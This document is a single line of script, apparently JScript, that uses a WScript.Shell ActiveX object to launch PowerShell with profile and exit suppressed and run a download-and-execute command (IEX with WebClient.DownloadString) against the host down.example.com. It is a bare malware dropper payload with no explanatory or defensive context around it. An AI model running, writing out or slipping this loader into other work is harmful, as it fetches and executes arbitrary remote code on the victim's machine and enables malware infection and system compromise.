a=new ActiveXObject('Wscript.Shell');a.Run("powershell -nop -noe -Command IEX (New-Object System.Net.WebClient).DownloadString('https://down.example.com')",1,true);
